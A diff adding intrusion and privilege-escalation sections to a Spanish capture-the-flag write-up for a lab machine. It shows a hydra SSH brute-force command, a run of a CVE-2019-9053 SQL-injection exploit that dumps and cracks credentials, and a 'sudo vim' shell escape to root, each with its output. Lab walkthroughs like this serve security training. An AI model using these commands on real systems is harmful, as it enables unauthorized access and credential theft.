@@ -66,3 +66,49 @@ Progress: 952 / 953 (99.90%)
 Finished
 ===============================================================
 ```
+## Intrusión
+Podemos conectarnos al FTP como usuario anonymous y en modo passive, encontraremos el sigueinte txt.
+```
+Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
+```
+Si seguimos buscando por la web veremos que se ha colgado una noticia por el usuario mitch, por lo tanto probaremos a realizar un ataque de fuerza bruta contra este usuario:
+```bash
+└─$ hydra -V -t 4 -l mitch -P /usr/share/wordlists/rockyou.txt  ssh://10.10.127.116:2222
+[2222][ssh] host: 10.10.127.116   login: mitch   password: secret
+```
+Obtendremos las credenciales con las que accederemos por ssh y con las que podremos acceder al panel de admin de la wev,
+
+No obstante, el sitio web también presenta la siguiente vulnerabilidad: CVE-2019-9053, por lo que descargaremos el exploit desde exploit-db (este vulnera mediante sqli).
+Veremos que hemos de retocar la sintaxis de la función print añadiendo parentesis para su correcta interpretación en python3
+```bash
+┌──(yeray㉿kali)-[~/THM/SimpleCTF]
+└─$ sudo python2 46635.py -u http://10.10.118.69/simple --crack -w /usr/share/wordlists/rockyou.txt
+
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret                                                                                                                                                                                    
+```
+Necesitaremos instalar la dependencia de termcolor para su correcta ejecución.
+
+## Escalada de privilegios
+Nos conectaremos por ssh a través del puerto 2222 con las credenciales obtenidas e intriduciremos el siguiente comando para generar una shell interactiva
+```bash
+┌──(yeray㉿kali)-[~/THM/SimpleCTF]
+└─$ ssh mitch@10.10.118.69 -p 2222  
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+mitch@Machine:~$
+```
+Veremos que podemos escalar privilegios gracias al permiso de sudo que tenemos sobre vim, si buscamos en GTFOBins veremos como podemos escalar privilegios.
+```bash
+mitch@Machine:~$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+mitch@Machine:~$ sudo vim -c ':!/bin/sh'
+
+# python3 -c 'import pty; pty.spawn("/bin/bash")'
+root@Machine:~# whoami
+root
+
+```
